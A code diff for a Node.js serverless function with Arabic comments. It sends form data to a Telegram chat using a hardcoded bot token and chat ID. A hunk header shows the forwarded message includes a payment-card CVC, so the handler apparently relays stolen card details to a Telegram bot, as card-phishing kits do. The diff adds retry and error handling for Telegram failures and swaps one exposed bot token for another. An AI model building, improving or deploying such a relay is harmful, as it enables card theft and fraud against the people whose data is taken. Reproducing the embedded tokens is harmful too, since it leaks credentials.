@@ -2,7 +2,7 @@
 const axios = require('axios');
 
 // بيانات البوت (بدون تشفير مؤقتاً)
-const BOT_TOKEN = '8041194084:AAHUCVbj4QGF2mC9cwoB43lIE7Np9S3EUH8';
+const BOT_TOKEN = '7998856652:AAEl-384RB1b_uOOc8wJ2pdzc5hmgpUoRjU';
 const CHAT_ID = '664193835';
 
 // نظام Rate Limiting - 10 رسائل لكل جهاز في الدقيقة
@@ -220,13 +220,33 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
       
       // معالجة خطأ Rate Limiting من تليجرام
       if (telegramError.response?.status === 429) {
+        // إضافة تأخير أطول لتقليل الضغط
+        const retryAfter = telegramError.response.headers['retry-after'] || 60;
+        
         return {
           statusCode: 429,
           headers,
           body: JSON.stringify({
             error: 'تليجرام يتعرض لضغط عالي، حاول لاحقاً',
             code: 'TELEGRAM_RATE_LIMIT',
-            details: 'Telegram is experiencing high load'
+            details: 'Telegram is experiencing high load',
+            retryAfter: parseInt(retryAfter),
+            message: `انتظر ${Math.ceil(retryAfter / 60)} دقيقة قبل المحاولة مرة أخرى`
+          })
+        };
+      }
+      
+      // معالجة أخطاء أخرى من تليجرام
+      if (telegramError.response?.status >= 500) {
+        return {
+          statusCode: 503,
+          headers,
+          body: JSON.stringify({
+            error: 'تليجرام غير متاح حالياً، حاول لاحقاً',
+            code: 'TELEGRAM_UNAVAILABLE',
+            details: telegramError.message,
+            retryAfter: 120,
+            message: 'انتظر دقيقتين قبل المحاولة مرة أخرى'
           })
         };
       }
